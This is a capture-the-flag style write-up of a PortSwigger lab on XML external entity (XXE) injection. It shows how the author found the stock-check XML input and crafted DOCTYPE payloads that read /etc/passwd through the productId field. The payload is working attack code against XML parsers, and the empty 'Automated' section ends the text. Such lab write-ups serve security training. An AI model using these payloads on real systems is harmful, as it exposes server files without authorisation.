\+ Lab #1    : Exploiting XXE to retrieve files\
\+ Lab Level : Apprentice\
\+ Link      : https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

## About:
This lab has a ```Check stock``` feature that parses XML input and returns any unexpected values in the response.<br/>
To solve the lab, inject an XML external entity to retrieve the contents of the ```/etc/passwd``` file. <br/>

## End Goal:
Retrieve the content of ```/etc/passwd``` file.

## Detection:
* First of all, we need to find an XML data entry point where we can test for XXE vulnerability.
* According to the lab description, the target Web Application has a check stock feature that parses XML input.
  ![XXE](https://user-images.githubusercontent.com/101610095/221443861-16357268-24f6-40be-9eba-cf94b6c412a8.png)
* Let's visit the ```/product``` page and intercept the POST request after clicking on the ```check stock``` button:
  ![XXE2](https://user-images.githubusercontent.com/101610095/221443309-560773a8-e280-438b-b7e9-162d23f0d046.png)
* As you can see here, after clicking on the check stock button, a client-side script issues a POST request to the server, and then the server respond with the following response:<br/> 
  ![XXE3](https://user-images.githubusercontent.com/101610095/221443796-aa626e12-d1df-4bc4-80a2-b2d2d82e0e89.png)
* The client-side script will then process the server's response and update part of the user interface by displaying the number of products left.<br/>
  ![XXE1](https://user-images.githubusercontent.com/101610095/221443008-d18e6537-9e12-4868-9742-a4f126fd598b.png)

> 📝: **NOTE:** <br/>
> Notice that there are 2 data values within the submitted XML document, which means to test systematically for XXE vulnerabilities, we need to test each data node in the XML individually.<br/>
> ![XXE5](https://user-images.githubusercontent.com/101610095/221444607-7e192970-4499-4734-bcb9-1f638b97288f.png)

## Exploitation:
### Manual:
#### Crafting the payload:
* In order to exploit this XXE vulnerability and retrieve the content of ```/etc/passwd``` file, we need to add a suitable ```DOCTYPE``` element that defines an external entity to the XML.
* An External Entity reference is specified using the ```SYSTEM``` keyword and its definition is the ```URL``` from which the value of the entity should be loaded.
* Since, we want to retrieve a local file, we will use ```file:///etc/passwd``` as the URL for our external entity.
* The malicious external entity  should look to something like this:
```XML
<!DOCTYPE foo [ <!ENTITY file SYSTEM "file:///etc/passwd"> ]>
```
* At this stage, all we need to do is to inject this external entity in between the ```XML Prolog``` and the root element ```<stockCheck>```
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  ...
</stockCheck>
```
#### Testing for XXE:
* Let's start with the ```productId``` child element, and replace the *productId* number with a reference to our malicious external entity ```&file;```  :
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>
    &file;
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```
* Let's send the request:<br/>
  ![request](https://user-images.githubusercontent.com/101610095/221447680-dbba6f8b-447b-48a2-9848-d2ed61c2db12.png)
* Server's Response:<br/>
  ![response](https://user-images.githubusercontent.com/101610095/221447686-dd8b0acd-e3ab-41e2-a80c-262515be4c40.png)
* As you can see, we were able to retrieve the content of /etc/passwd file, which means the ```productId``` data node is vulnerable to XXE injection.<br/>
<br/>

* Now, let's test if the ```storeId``` data node is also vulnerable to XXE injection: 
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>
    1
  </productId>
  <storeId>
    &file;
  </storeId>
</stockCheck>
```
* Request: <br/>
![request](https://user-images.githubusercontent.com/101610095/221448126-053c31ab-2723-4dca-abac-98c3c1e7a91c.png)

* Response: <br/>
![response2](https://user-images.githubusercontent.com/101610095/221448138-8f0993f3-10c6-4c03-8111-c2cc00dfcf6c.png)
* It looks like the second data ```storeId``` node is not vulnerable to XXE injection. 

### Automated:

